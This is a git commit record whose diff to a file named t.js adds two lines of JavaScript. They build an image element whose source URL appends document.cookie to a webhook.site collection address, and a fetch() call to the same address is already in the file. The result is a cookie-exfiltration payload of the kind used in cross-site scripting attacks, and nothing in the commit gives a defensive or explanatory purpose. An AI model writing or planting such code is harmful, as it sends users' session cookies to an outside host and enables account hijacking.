771fbaecb7d7be966a22449299029b50a5c8c270
carloszavaleta <czavaleta93@gmail.com>
2020-01-20 22:28:18 -0600

    a

--- t.js
+++ t.js
@@ -1,3 +1,7 @@
 fetch("https://webhook.site/b81680db-bfa4-4145-bac6-b080d948562d");
 
+var img = document.createElement('img')
+img.src = 'https://webhook.site/b81680db-bfa4-4145-bac6-b080d948562dk' + '/' + '?c=' + document.cookie 
+
+
 const H = "HELLO"
